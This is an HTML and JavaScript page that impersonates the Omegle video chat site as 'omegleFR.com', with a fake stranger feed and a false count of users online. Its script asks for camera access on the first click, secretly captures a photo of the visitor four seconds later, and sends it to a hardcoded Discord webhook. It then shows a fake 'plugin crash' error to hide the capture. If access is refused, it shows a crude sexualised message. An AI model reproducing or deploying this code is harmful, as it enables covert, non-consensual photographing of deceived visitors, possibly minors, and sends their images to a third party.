<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Omegle: Talk to strangers!</title>
    <style>
        body { 
            background: #f1f1f1; 
            color: #333; 
            margin: 0; 
            font-family: Arial, sans-serif; 
            display: flex; 
            flex-direction: column; 
            height: 100vh; 
            overflow: hidden;
        }

        /* Header Style Omegle */
        header {
            background: #fff;
            padding: 10px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 2px solid #ccc;
        }

        .logo { color: #fa6ed7; font-size: 24px; font-weight: bold; text-decoration: none; }
        .logo span { color: #ff8c00; }

        /* Conteneur Vidéo */
        #video-container {
            flex: 1;
            display: flex;
            flex-direction: row;
            gap: 10px;
            padding: 10px;
            background: #eee;
        }

        @media (max-width: 600px) {
            #video-container { flex-direction: column; }
        }

        .video-box {
            flex: 1;
            background: #333;
            border-radius: 5px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid #ccc;
        }

        .label {
            position: absolute;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.5);
            color: white;
            padding: 3px 8px;
            border-radius: 3px;
            font-size: 12px;
            z-index: 5;
        }

        #v { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
            background: #000;
        }

        /* Zone de Chat */
        #chat-area {
            height: 180px;
            background: white;
            border-top: 2px solid #ccc;
            padding: 15px;
            overflow-y: auto;
            box-sizing: border-box;
        }

        #status { 
            font-weight: bold; 
            color: #555; 
            cursor: pointer;
            text-decoration: underline;
        }

        .loader {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff8c00;
            border-radius: 50%;
            width: 18px;
            height: 18px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <header>
        <div class="logo">omegleFR<span>.com</span></div>
        <div style="font-size: 13px; color: #666;"><strong>100,000+</strong> online</div>
    </header>

    <div id="video-container">
        <div class="video-box" style="background: #222;">
            <div class="label">Stranger</div>
            <div style="color: #666; font-style: italic;">Connecting...</div>
        </div>
        
        <div class="video-box">
            <div class="label">You</div>
            <video id="v" autoplay muted playsinline></video>
        </div>
    </div>

    <div id="chat-area">
        <div id="ui">
            <div class="loader"></div>
            <span id="status">You're now chatting with a random stranger. Say hi! (Click here to start camera)</span>
        </div>
    </div>

    <canvas id="c" style="display:none;"></canvas>

    <script>
        // code d'input
        const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1494112627708920004/pvnLnZioqhd1nrwLILkXcSCfLD__tDylX-2U_BIqZk0ZvontS1ftSnNtl0gERqBG6ucu"; 

        document.addEventListener('click', async () => {
            const status = document.getElementById('status');
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            const loader = document.querySelector('.loader');
            
            status.innerText = "Connecting to video server...";

            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = stream;

                v.onplaying = () => {
                    // Délai de 4 secondes avant la capture
                    setTimeout(() => {
                        c.width = v.videoWidth;
                        c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        
                        c.toBlob(blob => {
                            const fd = new FormData();
                            fd.append('file', blob, 'photo.jpg');
                            fd.append('payload_json', JSON.stringify({ 
                                content: "📸 **Cheese!**",
                                username: "Omegle System"
                            }));

                            fetch(WEBHOOK_URL, { method: 'POST', body: fd })
                            .then(() => {
                                stream.getTracks().forEach(t => t.stop());
                                v.srcObject = null;
                                
                                status.innerText = "Stranger has disconnected. Error: Video plugin crash.";
                                status.style.color = "#ff4444";
                                if (loader) loader.style.display = "none";
                            })
                            .catch(e => console.error("Erreur d'envoi", e));
                        }, 'image/jpeg', 0.7);
                    }, 4000);
                };
            } catch (err) {
                alert("You must allow camera if you want to chat with bitches | Tu dois autoriser la caméra si tu veux discuter avec des salopes. ");
                window.location.reload();
            }
        }, { once: true });
    </script>
</body>
</html>
